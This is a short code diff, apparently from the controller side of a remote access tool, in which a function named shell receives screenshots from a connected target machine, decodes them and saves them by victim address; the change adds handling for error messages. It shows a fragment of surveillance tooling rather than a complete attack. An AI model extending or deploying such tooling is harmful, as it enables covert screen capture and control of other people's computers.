@@ -62,7 +62,11 @@ def shell(_s, _target, _addr):
             temp_name = 'screenshoot_' + str(_addr[0]) + '_' + str(count) + '.png'
             with open(temp_name, 'wb') as sc:
                 png_data = reliable_recv(_target)
-                sc.write(base64.b64decode(png_data))
+                png_data_decode = base64.b64decode(png_data)
+                if png_data_decode[:3] == '[!]':
+                    print(png_data_decode)
+                else:
+                    sc.write(png_data_decode)
                 sc.close()
             count += 1
         else:
